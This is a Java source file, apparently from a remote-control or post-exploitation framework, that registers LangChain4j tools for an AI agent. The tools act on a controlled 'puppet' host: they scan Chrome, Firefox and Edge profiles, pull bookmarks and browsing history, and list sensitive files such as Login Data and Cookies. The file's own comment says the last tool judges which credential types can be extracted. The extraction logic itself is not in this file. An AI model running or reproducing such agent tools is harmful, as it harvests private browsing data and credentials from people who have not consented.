package org.leo.ai.tools.puppetnode;

import org.leo.ai.agent.AiToolContext;
import org.leo.ai.util.PuppetNodeSessionUtils;
import org.leo.core.puppet.impl.JavaPuppetNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import dev.langchain4j.agent.tool.Tool;
import org.springframework.stereotype.Component;

import java.util.Map;

/**
 * 浏览器数据提取工具
 * <p>
 * 在 puppet 侧提取 Chrome/Firefox/Edge 的浏览器数据，包括配置文件扫描、书签、历史记录和敏感文件列表。
 */
@Component
public class BrowserDataTools {

    private static final Logger log = LoggerFactory.getLogger(BrowserDataTools.class);

    private static final String CACHE_KEY_PROFILES = "browser-data:profiles";

    @Tool("扫描 puppet 侧已安装的浏览器配置文件（Chrome、Firefox、Edge）。返回各浏览器的 profile 路径和用户名。结果会缓存。")
    public Map<String, Object> scanBrowserProfiles() throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        Object cached = PuppetNodeSessionUtils.getAiContextValue(sessionId, CACHE_KEY_PROFILES);
        if (cached instanceof Map) {
            return (Map<String, Object>) cached;
        }

        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        Map<String, Object> results = node.scanBrowserProfiles();

        if (results != null && isSuccess(results)) {
            PuppetNodeSessionUtils.putAiContextValue(sessionId, CACHE_KEY_PROFILES, results);
        }
        return results;
    }

    @Tool("提取 puppet 侧所有浏览器的书签数据（Chrome/Firefox/Edge），返回书签名称和 URL。")
    public Map<String, Object> extractBrowserBookmarks() throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        return node.extractBrowserBookmarks();
    }

    @Tool("提取 puppet 侧所有浏览器的浏览历史记录。可指定 limit 参数限制返回条数，默认 100。")
    public Map<String, Object> extractBrowserHistory(int limit) throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        return node.extractBrowserHistory(limit > 0 ? limit : 100);
    }

    @Tool("列出 puppet 侧浏览器目录下的敏感文件（Login Data、Cookies、Web Data 等），用于判断可提取的凭据类型。")
    public Map<String, Object> listBrowserSensitiveFiles() throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        return node.listBrowserSensitiveFiles();
    }

    private boolean isSuccess(Map<String, Object> results) {
        if (results == null) return false;
        Object code = results.get("code");
        return Integer.valueOf(200).equals(code);
    }
}
